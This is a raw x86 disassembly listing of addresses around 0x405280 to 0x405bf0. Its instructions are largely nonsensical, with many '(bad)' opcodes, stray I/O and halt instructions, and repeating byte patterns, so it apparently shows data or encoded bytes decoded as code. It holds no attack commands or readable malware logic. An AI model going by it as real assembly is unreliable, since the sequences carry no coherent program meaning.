  40527a:	pushf  
  40527b:	fcmove st,st(3)
  40527d:	pop    ecx
  40527e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40527f:	test   DWORD PTR [ebx],esi
  405281:	sub    esi,esi
  405283:	rcl    bl,1
  405285:	iret   
  405286:	push   edx
  405287:	mov    al,ds:0x3bbb86e4
  40528c:	add    esp,DWORD PTR [ecx+ebp*4+0x51029ca6]
  405293:	xor    edi,DWORD PTR [ebx]
  405295:	sbb    eax,0x666be939
  40529a:	mov    cl,0x6c
  40529c:	mov    ecx,ecx
  40529e:	xchg   ebx,eax
  40529f:	loope  0x4052b4
  4052a1:	fisttp DWORD PTR [edx+0x76]
  4052a4:	ret    
  4052a5:	aas    
  4052a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052a7:	dec    edx
  4052a8:	jecxz  0x405240
  4052aa:	es (bad) 
  4052ac:	cld    
  4052ad:	jae    0x4052eb
  4052af:	inc    esp
  4052b0:	fwait
  4052b1:	adc    bh,BYTE PTR [edi+edx*4+0x34]
  4052b5:	in     eax,dx
  4052b6:	mov    ebx,0x6c3f4474
  4052bb:	loope  0x40531f
  4052bd:	fdiv   st(7),st
  4052bf:	push   ebp
  4052c0:	xchg   edx,eax
  4052c1:	in     al,dx
  4052c2:	(bad)  
  4052c3:	(bad)  
  4052c4:	or     eax,0x6aa3a00f
  4052c9:	dec    eax
  4052ca:	sbb    ebx,ebp
  4052cc:	mov    dh,0xe4
  4052ce:	jnp    0x4052c9
	...
  4052e8:	add    BYTE PTR [ebx-0x80],dh
  4052eb:	xchg   edx,eax
  4052ec:	sub    DWORD PTR [edi-0x1c9d0864],0x580a3d37
  4052f6:	rcl    BYTE PTR [edi-0x8],1
  4052f9:	jmp    0xd398:0x5660b67f
  405300:	std    
  405301:	add    eax,eax
  405303:	push   0x4d
  405305:	mov    ebp,0xe8570f5c
  40530a:	pop    es
  40530b:	loope  0x4052f4
  40530d:	mov    ah,0x24
  40530f:	test   BYTE PTR [edi],ah
  405311:	sbb    BYTE PTR ds:0xf6a387d2,dl
  405317:	mov    dh,0x7d
  405319:	push   cs
  40531a:	dec    ebp
  40531b:	pop    ecx
  40531c:	sbb    eax,0x383cae8b
  405321:	mov    ch,0xa7
  405323:	test   eax,edx
  405325:	loope  0x4052ab
  405327:	loopne 0x4052fb
  405329:	lods   al,BYTE PTR ds:[esi]
  40532a:	fisttp WORD PTR ds:0x6b3ce82a
  405330:	xor    bh,dl
  405332:	jmp    DWORD PTR [ecx-0x38e33946]
  405338:	enter  0xc663,0x29
  40533c:	adc    BYTE PTR [edi+0x18ad4c64],bh
  405342:	ins    DWORD PTR es:[edi],dx
  405343:	cmc    
  405344:	sbb    eax,0x7908f84
  405349:	loope  0x40537f
  40534b:	jle    0x405304
	...
  405365:	add    BYTE PTR [ebp-0x29],bh
  405368:	sbb    al,BYTE PTR [eax]
  40536a:	sub    ebp,DWORD PTR [edx]
  40536c:	daa    
  40536d:	dec    ebp
  40536e:	jecxz  0x4052fe
  405370:	aas    
  405371:	sub    BYTE PTR [ecx+0x29c6ef33],dh
  405377:	pop    es
  405378:	mov    BYTE PTR [ebx+0x1ab05f9c],ah
  40537e:	aam    0xdb
  405380:	(bad)  
  405381:	jg     0x405379
  405383:	push   esi
  405384:	js     0x405317
  405386:	jle    0x40536a
  405388:	push   ds
  405389:	hlt    
  40538a:	neg    BYTE PTR [edx+0x1f5e03f6]
  405390:	nop
  405391:	data16 cmp al,0xa2
  405394:	ds mov ah,dh
  405397:	adc    eax,0x3d31ed58
  40539c:	pusha  
  40539d:	push   esp
  40539e:	fnstcw WORD PTR [edx+0x7]
  4053a1:	xor    ebx,ecx
  4053a3:	inc    ebp
  4053a4:	test   al,0xdf
  4053a6:	xor    edi,DWORD PTR [eax-0x31]
  4053a9:	mov    edx,0xecdf177b
  4053ae:	shl    DWORD PTR [edx+0x1e0189b7],cl
  4053b4:	pop    ss
  4053b5:	sbb    DWORD PTR [bp+si+0x26f],ebx
  4053ba:	lods   al,BYTE PTR ds:[esi]
  4053bb:	jb     0x405405
  4053bd:	mov    ebx,0xde2f44c4
  4053c2:	(bad)  
  4053c3:	jg     0x405345
  4053c5:	xor    BYTE PTR [esi+0x55e73d],ch
	...
  4053e3:	inc    esi
  4053e4:	mov    bl,0x9f
  4053e6:	pushf  
  4053e7:	push   cs
  4053e8:	xchg   bh,al
  4053ea:	stc    
  4053eb:	or     al,0xab
  4053ed:	addr16 pop ss
  4053ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053f0:	adc    BYTE PTR [edi],cl
  4053f2:	jb     0x4053f5
  4053f4:	aam    0x36
  4053f6:	retf   
  4053f7:	mov    DWORD PTR [ecx+0x50],ebp
  4053fa:	scas   al,BYTE PTR es:[edi]
  4053fb:	hlt    
  4053fc:	gs aaa 
  4053fe:	push   DWORD PTR [ebp+esi*8+0x35d9989b]
  405405:	jg     0x40538f
  405407:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405408:	mov    ch,0xda
  40540a:	out    dx,al
  40540b:	or     ah,BYTE PTR [eax-0x1fe3bf7b]
  405411:	shl    DWORD PTR [esi],1
  405413:	jno    0x405412
  405415:	pushf  
  405416:	pop    ds
  405417:	rol    BYTE PTR [eax+edi*1-0x5cdd4a88],1
  40541e:	xlat   BYTE PTR ds:[ebx]
  40541f:	dec    ebx
  405420:	jmp    0x405451
  405422:	mov    al,0xbe
  405424:	mov    eax,0xf92fb62c
  405429:	test   al,0xd1
  40542b:	inc    edx
  40542c:	fbstp  TBYTE PTR [ebx]
  40542e:	jle    0x4053d4
  405430:	pop    esi
  405431:	lahf   
  405432:	sbb    DWORD PTR [ecx+0x5820cef9],ebp
  405438:	ret    0x468a
  40543b:	in     eax,dx
  40543c:	arpl   bp,dx
  40543e:	call   0x8ec24016
  405443:	jbe    0x4053f8
  405445:	mov    al,ds:0x9e
	...
  40545e:	add    BYTE PTR [eax],al
  405460:	shr    BYTE PTR [ebx],0x34
  405463:	stc    
  405464:	sbb    DWORD PTR gs:[edi+0x2b523b56],esp
  40546b:	xor    esi,ecx
  40546d:	jle    0x4053f1
  40546f:	or     DWORD PTR [edi-0x72],esi
  405472:	(bad)  
  405473:	ins    DWORD PTR es:[edi],dx
  405474:	call   0xcd78:0xecc189a8
  40547b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40547c:	loope  0x405406
  40547e:	inc    ebx
  40547f:	loope  0x405411
  405481:	test   al,0x8f
  405483:	xchg   BYTE PTR ds:0xb293cae,dh
  405489:	sets   BYTE PTR [esi-0x42]
  40548d:	add    al,0xdb
  40548f:	in     eax,0xc1
  405491:	xchg   ecx,eax
  405492:	jae    0x405505
  405494:	in     eax,0x76
  405496:	jno    0x405476
  405498:	jns    0x4054a6
  40549a:	leave  
  40549b:	jp     0x4054ea
  40549d:	out    dx,eax
  40549e:	adc    BYTE PTR [edi+0x3b29393d],0x52
  4054a5:	ficomp WORD PTR [edx]
  4054a7:	nop
  4054a8:	cmc    
  4054a9:	les    eax,FWORD PTR [ebx-0x219865bc]
  4054af:	jp     0x40545b
  4054b1:	lock sub eax,0x340bbcde
  4054b7:	jno    0x40551b
  4054b9:	jne    0x40547f
  4054bb:	in     eax,0xe4
  4054bd:	xchg   edi,eax
  4054be:	xor    al,0x1d
  4054c0:	or     eax,0xb9b402
	...
  4054dd:	bound  esp,QWORD PTR ds:0x7bc526ce
  4054e3:	push   cs
  4054e4:	mov    dl,0x8a
  4054e6:	mov    al,ds:0x3779fbab
  4054eb:	and    edx,DWORD PTR [edi-0x33]
  4054ee:	aam    0x0
  4054f0:	add    al,0x32
  4054f2:	scas   al,BYTE PTR es:[edi]
  4054f3:	mov    ecx,0x7148d550
  4054f8:	mov    cl,0xe5
  4054fa:	sahf   
  4054fb:	mov    ecx,0xcb7c4a24
  405500:	mov    ecx,0x1e53269d
  405505:	jb     0x405508
  405507:	out    dx,al
  405508:	dec    esi
  405509:	push   edx
  40550a:	dec    edx
  40550b:	sahf   
  40550c:	add    esi,DWORD PTR [ebp+0xa5884ad]
  405512:	shl    ebx,cl
  405514:	sti    
  405515:	cld    
  405516:	aaa    
  405517:	in     al,0x15
  405519:	mov    edx,0xdc2846e
  40551e:	mov    WORD PTR [eax],es
  405520:	jle    0x40550b
  405522:	adc    BYTE PTR [ecx],0xde
  405525:	cmp    al,0xa6
  405527:	je     0x4055a4
  405529:	inc    eax
  40552a:	lods   eax,DWORD PTR ds:[esi]
  40552b:	int    0xd3
  40552d:	mov    ds:0x4ed1a84a,eax
  405532:	cmc    
  405533:	inc    ebp
  405534:	imul   ebx,DWORD PTR [ebx+0x3e212312],0xf1897523
  40553e:	add    eax,0x7b10
	...
  405557:	add    BYTE PTR [eax],al
  405559:	add    BYTE PTR [ebx+ebx*2],dh
  40555c:	(bad)  
  40555d:	and    ebp,ecx
  40555f:	mov    ebp,0x959c3e9b
  405564:	and    cl,dh
  405566:	(bad)  
  405568:	inc    edi
  405569:	aam    0x9a
  40556b:	int    0xa8
  40556d:	and    al,0xe7
  40556f:	sub    esp,ecx
  405571:	aas    
  405572:	sub    ebx,DWORD PTR [ebx+0x7d86af06]
  405578:	arpl   WORD PTR [ebp+0x458ce333],dx
  40557e:	add    BYTE PTR [ebp-0x18],0xa0
  405582:	aam    0xc
  405584:	push   ecx
  405585:	sub    BYTE PTR [ecx-0x15],cl
  405588:	xor    edi,DWORD PTR [edx]
  40558a:	into   
  40558b:	push   esp
  40558c:	fiadd  DWORD PTR [edx+0x3abfb321]
  405592:	jle    0x405556
  405594:	jmp    0x8ca6908b
  405599:	rol    BYTE PTR [edi-0x2cb79e06],1
  40559f:	sbb    eax,0x36192507
  4055a4:	mov    esi,0xdad18c65
  4055a9:	jg     0x4055ac
  4055ab:	outs   dx,BYTE PTR ds:[esi]
  4055ac:	xor    eax,0x508955ff
  4055b1:	add    bl,bh
  4055b3:	int3   
  4055b4:	mov    eax,0xde6fc399
  4055b9:	cld    
  4055ba:	rcr    edx,1
  4055bc:	jo     0x4055d0
	...
  4055d6:	add    BYTE PTR [ecx+0x66],cl
  4055d9:	push   ss
  4055da:	ja     0x405580
  4055dc:	lods   eax,DWORD PTR ds:[esi]
  4055dd:	sub    eax,0x49093cce
  4055e2:	stos   DWORD PTR es:[edi],eax
  4055e3:	dec    esi
  4055e4:	mov    ah,0xe5
  4055e6:	inc    ebp
  4055e7:	mov    BYTE PTR [eax+0x67fe2081],0x91
  4055ee:	jbe    0x405646
  4055f0:	fcomi  st,st(5)
  4055f2:	adc    edx,DWORD PTR [esi+ebp*2+0x59]
  4055f6:	std    
  4055f7:	or     al,0xd1
  4055f9:	cmp    eax,0x686a198
  4055fe:	and    DWORD PTR [ecx-0x46],ecx
  405601:	pusha  
  405602:	inc    esp
  405603:	dec    ebx
  405604:	bswap  esi
  405606:	stos   BYTE PTR es:[edi],al
  405607:	inc    ebx
  405608:	mov    dl,0xa8
  40560a:	iret   
  40560b:	mov    edi,edx
  40560d:	inc    eax
  40560e:	cmp    BYTE PTR [ebx],dh
  405610:	(bad)  
  405611:	es pop ebp
  405613:	and    ebx,esi
  405615:	mov    BYTE PTR [ebx-0x2911b067],dh
  40561b:	xor    al,0x94
  40561d:	aad    0x6f
  40561f:	ins    BYTE PTR es:[edi],dx
  405620:	and    BYTE PTR [ecx+0x1d8d5e0a],dh
  405626:	in     al,0xd6
  405628:	sub    BYTE PTR [ecx-0x7f],bh
  40562b:	into   
  40562c:	dec    edi
  40562d:	imul   edx,edi,0xb20df246
  405633:	in     al,0xc6
  405635:	mov    eax,ds:0xc5f89c5c
  40563a:	cmp    DWORD PTR [eax],eax
	...
  405654:	jno    0x40567e
  405656:	inc    BYTE PTR [eax-0x1a677407]
  40565c:	hlt    
  40565d:	jmp    0x2a3f8cc5
  405662:	lock push eax
  405664:	ficomp DWORD PTR [ecx]
  405666:	es push ss
  405668:	fwait
  405669:	mov    ch,BYTE PTR [ecx+0x1f003671]
  40566f:	fisub  WORD PTR [eax]
  405671:	xor    BYTE PTR [ebx+0x794bdb9],dh
  405677:	add    DWORD PTR [ebp+ebp*1+0x4c],0x13f61e6
  40567f:	dec    ecx
  405680:	scas   eax,DWORD PTR es:[edi]
  405681:	xchg   esi,eax
  405682:	push   esp
  405683:	or     bl,BYTE PTR cs:[edi-0x4f]
  405687:	lods   al,BYTE PTR ds:[esi]
  405689:	push   es
  40568a:	push   ds
  40568b:	pop    ecx
  40568c:	leave  
  40568d:	add    al,0xab
  40568f:	div    BYTE PTR [edi]
  405691:	ins    DWORD PTR es:[edi],dx
  405692:	es xchg ecx,eax
  405694:	push   edx
  405695:	push   eax
  405696:	push   ebx
  405697:	test   eax,0xce002fe3
  40569c:	jle    0x4056d7
  40569e:	dec    ebp
  40569f:	popa   
  4056a0:	mov    BYTE PTR [ecx+0x8],bl
  4056a3:	push   es
  4056a4:	in     eax,0x9b
  4056a6:	add    eax,DWORD PTR [eax]
  4056a8:	hlt    
  4056a9:	fwait
  4056aa:	add    eax,DWORD PTR [eax]
  4056ac:	hlt    
  4056ad:	fwait
  4056ae:	add    eax,DWORD PTR [eax]
  4056b0:	hlt    
  4056b1:	fwait
  4056b2:	add    eax,DWORD PTR [eax]
  4056b4:	hlt    
  4056b5:	fwait
  4056b6:	add    eax,DWORD PTR [eax]
	...
  4056d0:	add    ah,dh
  4056d2:	fwait
  4056d3:	add    eax,DWORD PTR [eax]
  4056d5:	hlt    
  4056d6:	fwait
  4056d7:	add    eax,DWORD PTR [eax]
  4056d9:	hlt    
  4056da:	fwait
  4056db:	add    eax,DWORD PTR [eax]
  4056dd:	hlt    
  4056de:	pushf  
  4056df:	add    eax,DWORD PTR [eax]
  4056e1:	hlt    
  4056e2:	pushf  
  4056e3:	add    eax,DWORD PTR [eax]
  4056e5:	hlt    
  4056e6:	pushf  
  4056e7:	add    eax,DWORD PTR [eax]
  4056e9:	hlt    
  4056ea:	pushf  
  4056eb:	add    eax,DWORD PTR [eax]
  4056ed:	hlt    
  4056ee:	add    al,0xeb
  4056f0:	add    esi,esp
  4056f2:	add    al,0xeb
  4056f4:	add    esi,esp
  4056f6:	add    al,0xeb
  4056f8:	add    esi,esp
  4056fa:	add    al,0xeb
  4056fc:	add    esi,esp
  4056fe:	add    al,0xea
  405700:	add    esi,esp
  405702:	add    al,0xea
  405704:	add    esi,esp
  405706:	add    al,0xea
  405708:	add    esi,esp
  40570a:	add    al,0xea
  40570c:	add    esi,esp
  40570e:	add    al,0xed
  405710:	add    esi,esp
  405712:	add    al,0xe5
  405714:	add    esi,esp
  405716:	add    al,0xed
  405718:	add    esi,esp
  40571a:	add    al,0xe5
  40571c:	add    esi,esp
  40571e:	add    al,0xec
  405720:	add    esi,esp
  405722:	add    al,0xe4
  405724:	add    esi,esp
  405726:	add    al,0xec
  405728:	add    esi,esp
  40572a:	add    al,0xe4
  40572c:	add    esi,esp
  40572e:	add    al,0xe9
  405730:	add    esi,esp
  405732:	add    al,0xf9
  405734:	repnz add BYTE PTR [eax],al
	...
  40574b:	add    BYTE PTR [eax],al
  40574d:	add    ch,ah
  40574f:	add    al,0xe1
  405751:	add    al,0xfd
  405753:	(bad)  
  405754:	loop   0x40575c
  405756:	inc    DWORD PTR [eax]
  405758:	cmc    
  405759:	add    cl,dh
  40575b:	add    ch,bh
  40575d:	add    ch,bl
  40575f:	add    al,0xe9
  405761:	add    esi,esp
  405763:	add    al,0xe9
  405765:	add    esi,esp
  405767:	add    al,0xe9
  405769:	add    esi,esp
  40576b:	add    al,0xe9
  40576d:	add    esi,esp
  40576f:	add    al,0xe8
  405771:	add    esi,esp
  405773:	add    al,0xe8
  405775:	add    esi,esp
  405777:	add    al,0xeb
  405779:	add    esi,esp
  40577b:	add    al,0xeb
  40577d:	add    esi,esp
  40577f:	add    al,0x0
  405781:	jmp    0x4f7:0xea0004f7
  405788:	add    ch,ch
  40578a:	test   DWORD PTR [eax+eax*1],0x4f7e5
  405791:	in     al,dx
  405792:	test   DWORD PTR [eax+eax*1],0x4f7e4
  405799:	out    dx,eax
  40579a:	test   DWORD PTR [eax+eax*1],0x4f7e7
  4057a1:	out    dx,al
  4057a2:	test   DWORD PTR [eax+eax*1],0x4f7e6
  4057a9:	icebp  
  4057aa:	test   DWORD PTR [eax+eax*1],0x4f7f1
  4057b1:	loopne 0x4057b3
	...
  4057cb:	test   DWORD PTR [eax+eax*1],0x4f7e0
  4057d2:	repz test DWORD PTR [eax+eax*1],0x4f7f3
  4057da:	loop   0x4057d3
  4057dc:	add    al,0x0
  4057de:	loop   0x4057d7
  4057e0:	add    al,0x0
  4057e2:	cmc    
  4057e3:	test   DWORD PTR [eax+eax*1],0x4f7ed
  4057ea:	in     al,0xf7
  4057ec:	add    al,0x0
  4057ee:	fdivr  st(7),st
  4057f0:	add    al,0x0
  4057f2:	jmp    0xe9405cee
  4057f7:	test   DWORD PTR [eax+eax*1],0x4f7e9
  4057fe:	jmp    0xe9405cfa
  405803:	test   DWORD PTR [eax+eax*1],0x4f7e9
  40580a:	jmp    0xe9405d06
  40580f:	test   DWORD PTR [eax+eax*1],0x38d00
  405816:	add    BYTE PTR [ebp-0x62fffffd],cl
  40581c:	add    eax,DWORD PTR [eax]
  40581e:	add    BYTE PTR [ebp-0x72fffffd],bl
  405824:	add    eax,DWORD PTR [eax]
  405826:	add    BYTE PTR [ebp+0x5d000003],cl
  40582c:	add    eax,DWORD PTR [eax]
	...
  405846:	add    BYTE PTR [eax],al
  405848:	pop    ebp
  405849:	add    eax,DWORD PTR [eax]
  40584b:	add    BYTE PTR [edi+0x3],cl
  40584e:	add    BYTE PTR [eax],al
  405850:	dec    esi
  405851:	add    eax,DWORD PTR [eax]
  405853:	add    BYTE PTR [edx+0x3],ah
  405856:	add    BYTE PTR [eax],al
  405858:	pop    ebp
  405859:	add    eax,DWORD PTR [eax]
  40585b:	add    BYTE PTR [ecx+0x3],cl
  40585e:	or     BYTE PTR [eax],al
  405860:	leave  
  405861:	add    ecx,DWORD PTR [eax]
  405863:	add    BYTE PTR [ecx+0x3],bl
  405866:	or     BYTE PTR [eax],al
  405868:	or     DWORD PTR [eax+ecx*1],eax
  40586b:	add    BYTE PTR [ecx+0x3],cl
  40586e:	or     BYTE PTR [eax],al
  405870:	test   eax,0x79000803
  405875:	add    ecx,DWORD PTR [eax]
  405877:	add    BYTE PTR [ecx],cl
  405879:	add    cl,BYTE PTR [eax]
  40587b:	add    cl,bh
  40587d:	add    BYTE PTR [eax],cl
  40587f:	add    BYTE PTR [ecx+0x0],bh
  405882:	or     BYTE PTR [eax],al
  405884:	sub    DWORD PTR [ecx],eax
  405886:	or     BYTE PTR [eax],al
  405888:	cdq    
  405889:	add    DWORD PTR [eax],ecx
  40588b:	add    cl,bh
  40588d:	add    BYTE PTR [eax],cl
  40588f:	add    BYTE PTR [ecx+0x1],bl
  405892:	or     BYTE PTR [eax],al
  405894:	or     DWORD PTR [ecx],eax
  405896:	or     BYTE PTR [eax],al
  405898:	cdq    
  405899:	add    DWORD PTR [eax],ecx
  40589b:	add    bh,cl
  40589d:	add    cl,BYTE PTR [eax]
  40589f:	add    BYTE PTR [edi+0x1],cl
  4058a2:	or     BYTE PTR [eax],al
  4058a4:	hlt    
  4058a5:	fld    DWORD PTR [ebx]
  4058a7:	or     ah,dh
  4058a9:	pop    ecx
  4058aa:	add    al,0x8
	...
  4058c4:	add    ah,dh
  4058c6:	mov    ecx,0x39f40803
  4058cb:	add    al,0x8
  4058cd:	hlt    
  4058ce:	stc    
  4058cf:	add    ecx,DWORD PTR [eax]
  4058d1:	hlt    
  4058d2:	jns    0x4058d8
  4058d4:	or     ah,dh
  4058d6:	mov    DWORD PTR [ebx],eax
  4058d8:	or     ah,dh
  4058da:	or     DWORD PTR [eax+ecx*1],eax
  4058dd:	hlt    
  4058de:	dec    ecx
  4058df:	add    ecx,DWORD PTR [eax]
  4058e1:	hlt    
  4058e2:	leave  
  4058e3:	add    ecx,DWORD PTR [eax]
  4058e5:	hlt    
  4058e6:	mov    DWORD PTR [ebx],eax
  4058e8:	or     ah,dh
  4058ea:	or     DWORD PTR [eax+ecx*1],eax
  4058ed:	hlt    
  4058ee:	dec    ecx
  4058ef:	add    ecx,DWORD PTR [eax]
  4058f1:	hlt    
  4058f2:	leave  
  4058f3:	add    ecx,DWORD PTR [eax]
  4058f5:	hlt    
  4058f6:	xchg   ecx,eax
  4058f7:	add    ecx,DWORD PTR [eax]
  4058f9:	hlt    
  4058fa:	adc    DWORD PTR [eax+ecx*1],eax
  4058fd:	hlt    
  4058fe:	popa   
  4058ff:	add    ecx,DWORD PTR [eax]
  405901:	hlt    
  405902:	loope  0x405907
  405904:	or     ah,dh
  405906:	mov    cl,0x3
  405908:	or     ah,dh
  40590a:	xor    DWORD PTR [eax+ecx*1],eax
  40590d:	hlt    
  40590e:	add    DWORD PTR [ebx],0x401f408
  405914:	or     ah,dh
  405916:	add    DWORD PTR [eax+ecx*1],eax
  405919:	hlt    
  40591a:	add    DWORD PTR [ebx],0x3d1f408
  405920:	or     ah,dh
  405922:	push   ecx
  405923:	add    ecx,DWORD PTR [eax]
  405925:	hlt    
  405926:	add    DWORD PTR [eax+ecx*1],eax
	...
  405941:	add    ah,dh
  405943:	add    DWORD PTR [ebx],0x3d1f408
  405949:	or     ah,dh
  40594b:	push   ecx
  40594c:	add    ecx,DWORD PTR [eax]
  40594e:	hlt    
  40594f:	add    al,0xef
  405951:	add    ebp,esp
  405953:	add    al,0x67
  405955:	add    edi,esp
  405957:	add    al,0x2f
  405959:	add    al,0xfc
  40595b:	add    al,0xa7
  40595d:	add    ebp,esp
  40595f:	add    al,0xcf
  405961:	add    ebp,esp
  405963:	add    al,0x47
  405965:	add    edi,esp
  405967:	add    al,0xf
  405969:	add    al,0xfc
  40596b:	add    al,0x87
  40596d:	add    ebp,esp
  40596f:	add    al,0xff
  405971:	add    ebp,esp
  405973:	add    al,0x77
  405975:	add    edi,esp
  405977:	add    al,0xbf
  405979:	add    edi,esp
  40597b:	add    al,0x37
  40597d:	add    ebp,esp
  40597f:	add    al,0xff
  405981:	add    ebp,esp
  405983:	add    al,0x77
  405985:	add    edi,esp
  405987:	add    al,0xbf
  405989:	add    edi,esp
  40598b:	add    al,0x37
  40598d:	add    ebp,esp
  40598f:	add    al,0xf7
  405991:	add    ebp,esp
  405993:	add    al,0x6f
  405995:	add    edi,esp
  405997:	add    al,0xa7
  405999:	add    edi,esp
  40599b:	add    al,0x1f
  40599d:	add    ebp,esp
  40599f:	add    al,0xd7
  4059a1:	add    ebp,esp
  4059a3:	add    al,0x4f
  4059a5:	add    eax,DWORD PTR [eax]
	...
  4059bf:	cld    
  4059c0:	add    al,0x87
  4059c2:	add    edi,esp
  4059c4:	add    al,0xff
  4059c6:	add    ch,ah
  4059c8:	add    al,0x7
  4059ca:	add    al,0xec
  4059cc:	add    al,0x7f
  4059ce:	add    al,0xfc
  4059d0:	add    al,0x37
  4059d2:	add    al,0xfc
  4059d4:	add    al,0xaf
  4059d6:	add    al,0xec
  4059d8:	add    al,0x7
  4059da:	add    al,0xec
  4059dc:	add    al,0x7f
  4059de:	add    al,0xfc
  4059e0:	add    al,0x0
  4059e2:	aaa    
  4059e3:	lock or al,0x0
  4059e6:	scas   eax,DWORD PTR es:[edi]
  4059e7:	clc    
  4059e8:	or     al,0x0
  4059ea:	call   0x684066e6
  4059ef:	clc    
  4059f0:	or     al,0x0
  4059f2:	sub    al,dh
  4059f4:	or     al,0x0
  4059f6:	test   al,0xf8
  4059f8:	or     al,0x0
  4059fa:	enter  0xcf7,0x0
  4059fe:	dec    eax
  4059ff:	clc    
  405a00:	or     al,0x0
  405a02:	or     al,dh
  405a04:	or     al,0x0
  405a06:	mov    al,bh
  405a08:	or     al,0x0
  405a0a:	clc    
  405a0b:	test   DWORD PTR [eax+eax*1],0xcf878
  405a12:	mov    eax,0x38000cf7
  405a17:	clc    
  405a18:	or     al,0x0
  405a1a:	clc    
  405a1b:	test   DWORD PTR [eax+eax*1],0xcf878
  405a22:	mov    eax,0x0
	...
  405a3b:	add    bh,dh
  405a3d:	or     al,0x0
  405a3f:	cmp    al,bh
  405a41:	or     al,0x0
  405a43:	lock test DWORD PTR [eax+eax*1],0xcf870
  405a4b:	mov    al,ds:0x20000cf7
  405a50:	clc    
  405a51:	or     al,0x0
  405a53:	shl    bh,1
  405a55:	or     al,0x0
  405a57:	push   eax
  405a58:	clc    
  405a59:	or     al,0x0
  405a5b:	xor    bh,0xc
  405a5e:	add    BYTE PTR [eax],al
  405a60:	clc    
  405a61:	or     al,0x0
  405a63:	add    al,dh
  405a65:	or     al,0x0
  405a67:	xor    bh,0xc
  405a6a:	add    BYTE PTR [eax],dh
  405a6c:	lock or al,0x0
  405a6f:	mov    al,0xf7
  405a71:	or     al,0x0
  405a73:	add    ah,dh
  405a75:	or     BYTE PTR [eax],cl
  405a77:	add    BYTE PTR [edi+eax*1+0x8],dh
  405a7b:	add    BYTE PTR [ecx+ecx*1],al
  405a7e:	or     BYTE PTR [eax],al
  405a80:	test   BYTE PTR [edi],al
  405a82:	or     BYTE PTR [eax],al
  405a84:	enter  0x807,0x0
  405a88:	sbb    BYTE PTR [eax],cl
  405a8a:	or     BYTE PTR [eax],al
  405a8c:	fmul   DWORD PTR [eax]
  405a8e:	or     BYTE PTR [eax],al
  405a90:	pop    eax
  405a91:	pop    es
  405a92:	or     BYTE PTR [eax],al
  405a94:	test   al,0x7
  405a96:	or     BYTE PTR [eax],al
  405a98:	cmp    BYTE PTR [eax],cl
  405a9a:	or     BYTE PTR [eax],al
  405a9c:	clc    
  405a9d:	or     BYTE PTR [eax],cl
	...
  405ab7:	add    BYTE PTR [eax],al
  405ab9:	js     0x405ac2
  405abb:	or     BYTE PTR [eax],al
  405abd:	js     0x405ac6
  405abf:	or     BYTE PTR [eax],al
  405ac1:	call   0xa84062cd
  405ac6:	pop    es
  405ac7:	or     BYTE PTR [eax],al
  405ac9:	sub    BYTE PTR [eax],cl
  405acb:	or     BYTE PTR [eax],al
  405acd:	pop    eax
  405ace:	pop    es
  405acf:	or     BYTE PTR [eax],al
  405ad1:	enter  0x807,0x0
  405ad5:	mov    BYTE PTR [edi],al
  405ad7:	or     BYTE PTR [eax],al
  405ad9:	or     BYTE PTR [eax],cl
  405adb:	or     BYTE PTR [eax],al
  405add:	inc    eax
  405ade:	pop    es
  405adf:	or     BYTE PTR [eax],al
  405ae1:	mov    al,ds:0x50000807
  405ae6:	pop    es
  405ae7:	or     BYTE PTR [eax],al
  405ae9:	add    BYTE PTR [eax],cl
  405aeb:	or     BYTE PTR [eax],al
  405aed:	inc    eax
  405aee:	pop    es
  405aef:	or     BYTE PTR [eax],al
  405af1:	rol    BYTE PTR [edi],0x8
  405af4:	add    BYTE PTR [eax+0x7],dh
  405af7:	or     BYTE PTR [eax],al
  405af9:	add    BYTE PTR [esi],al
  405afb:	or     BYTE PTR [eax],al
  405afd:	lock or BYTE PTR [eax],cl
  405b00:	add    BYTE PTR [eax+0x9],dh
  405b03:	or     BYTE PTR [eax],al
  405b05:	hlt    
  405b06:	cmp    BYTE PTR [eax+ecx*1],al
  405b09:	hlt    
  405b0a:	mov    al,0x4
  405b0c:	or     ah,dh
  405b0e:	or     BYTE PTR [eax+ecx*1],al
  405b11:	hlt    
  405b12:	add    BYTE PTR [eax+ecx*1],al
  405b15:	hlt    
  405b16:	cmp    BYTE PTR [eax+ecx*1],al
  405b19:	hlt    
  405b1a:	mov    al,0x4
  405b1c:	or     BYTE PTR [eax],al
	...
  405b36:	hlt    
  405b37:	jle    0x405b3c
  405b39:	or     esp,esi
  405b3b:	jle    0x405b41
  405b3d:	or     esp,esi
  405b3f:	inc    BYTE PTR [ebx]
  405b41:	or     esp,esi
  405b43:	inc    BYTE PTR [ecx+ecx*1]
  405b46:	hlt    
  405b47:	push   ds
  405b48:	add    al,0x9
  405b4a:	hlt    
  405b4b:	push   ds
  405b4c:	add    eax,0x49ef409
  405b51:	or     esp,esi
  405b53:	sahf   
  405b54:	add    eax,0x41ef409
  405b59:	or     esp,esi
  405b5b:	push   ds
  405b5c:	add    eax,0x49ef409
  405b61:	or     esp,esi
  405b63:	sahf   
  405b64:	add    eax,0x3bef409
  405b69:	or     esp,esi
  405b6b:	mov    esi,0x3ef40904
  405b70:	add    al,0x9
  405b72:	hlt    
  405b73:	ds add eax,0x376f409
  405b79:	or     esp,esi
  405b7b:	jbe    0x405b81
  405b7d:	or     esp,esi
  405b7f:	out    0x3,al
  405b81:	or     esp,esi
  405b83:	out    0x4,al
  405b85:	or     esp,esi
  405b87:	mov    dh,0x3
  405b89:	or     esp,esi
  405b8b:	mov    dh,0x4
  405b8d:	or     esp,esi
  405b8f:	es add al,0x9
  405b92:	hlt    
  405b93:	es add eax,0x1204f409
  405b99:	add    al,0x0
	...
  405bb3:	std    
  405bb4:	add    al,0x12
  405bb6:	add    eax,0x38204fd
  405bbb:	in     eax,dx
  405bbc:	add    al,0x82
  405bbe:	add    al,0xed
  405bc0:	add    al,0x52
  405bc2:	add    al,0xfd
  405bc4:	add    al,0x52
  405bc6:	add    eax,0x3c204fd
  405bcb:	in     eax,dx
  405bcc:	add    al,0xc2
  405bce:	add    al,0xed
  405bd0:	add    al,0x2
  405bd2:	add    al,0xfd
  405bd4:	add    al,0x2
  405bd6:	add    eax,0x37204fd
  405bdb:	in     eax,dx
  405bdc:	add    al,0x72
  405bde:	add    al,0xed
  405be0:	add    al,0x22
  405be2:	add    al,0xfd
  405be4:	add    al,0x22
  405be6:	add    eax,0x39204fd
  405beb:	in     eax,dx
  405bec:	add    al,0x92
  405bee:	add    al,0xed
